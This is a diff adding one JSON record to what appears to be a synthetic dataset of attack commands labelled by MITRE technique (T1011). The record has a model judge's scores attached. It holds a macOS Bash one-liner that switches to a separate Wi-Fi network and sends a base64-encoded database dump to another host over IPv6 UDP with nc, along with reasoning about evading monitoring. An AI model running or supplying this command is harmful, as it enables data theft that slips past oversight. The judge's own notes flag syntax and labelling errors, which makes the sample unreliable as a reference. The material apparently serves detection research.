@@ -1,0 +1,38 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
+  "explanation": "Uses an alternate Wi\u2011Fi SSID to exfiltrate a database dump via IPv6 UDP to a high, uncommon port, reducing overlap with typical monitored services. This leverages a different network medium than the primary channel, consistent with T1011.",
+  "rationale_steps": [
+    "Drop any existing Wi\u2011Fi association.",
+    "Join a non-corporate SSID on a less common 5 GHz channel.",
+    "Base64-encode the dump to make payload less obvious in transit.",
+    "Transmit via IPv6 UDP on a high port scoped to the Wi\u2011Fi interface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-0762cc79",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Well-formed with balanced quotes and valid chaining, but nc\u2019s -w option is placed after host/port, which many BSD nc versions reject.",
+        "semantic_score": 2,
+        "semantic_justification": "While it plausibly switches Wi\u2011Fi and exfiltrates via IPv6/UDP, it does not leverage system script proxy execution as described and also conflicts with the 'Privilege: None' claim by using sudo.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T22:42:26.339885Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
